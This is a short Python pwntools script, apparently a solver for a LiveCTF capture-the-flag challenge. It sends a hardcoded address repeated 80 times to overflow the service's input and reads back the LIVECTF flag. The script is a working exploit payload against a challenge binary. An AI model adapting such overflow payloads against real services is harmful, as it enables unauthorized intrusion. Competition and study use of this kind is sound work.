from pwn import *
import sys
import time
import re
context.log_level = 'error'

host = sys.argv[1]
port = int(sys.argv[2])

r = remote(host, port)
s = r.recvline()

flag = 0x4040a0

r.recvuntil(b"Answer > ")
r.sendline(p64(flag) * 80)
r.recvuntil(b"Wrong...")
r.recvline()
s = r.recvline().decode("ascii")

m = re.search("LIVECTF{.*}", s)
if m is not None:
    print(m.group(0))
    exit(0)
else:
    exit(1)
